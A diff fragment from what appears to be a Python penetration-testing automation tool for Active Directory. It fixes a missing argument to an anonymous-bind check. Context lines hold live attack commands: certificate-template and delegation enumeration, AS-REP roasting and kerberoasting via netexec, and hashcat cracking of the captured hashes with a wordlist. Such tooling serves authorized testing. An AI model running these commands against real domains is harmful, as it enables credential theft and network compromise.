@@ -137,7 +137,7 @@ def ldap_tasks(context):
         run_task(context, f"certipy find -u {user}@{context.domain} -p '{passwd}' -k -target {target} -dc-ip {context.ip} -stdout -timeout 2 -enabled; certipy find -u {user}@{context.domain} -p '{passwd}' -k -target {target} -dc-ip {context.ip} -stdout -timeout 2 -vulnerable; powerview {context.domain}/{user}:'{passwd}'@{context.ip} --web")
         run_task(context, "neo4j start; sleep 5; bloodhound &> /dev/null & disown")
     else:
-        if anonymous_bind():
+        if anonymous_bind(context):
             write_log(context.log_file, f"LDAP anonymous bind is enabled", "SUCCESS")
             run_task(context, f"nxc ldap {target} -u '' -p '' --asreproast hashes.asreproast --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
             run_task(context, f"powerview {target}")
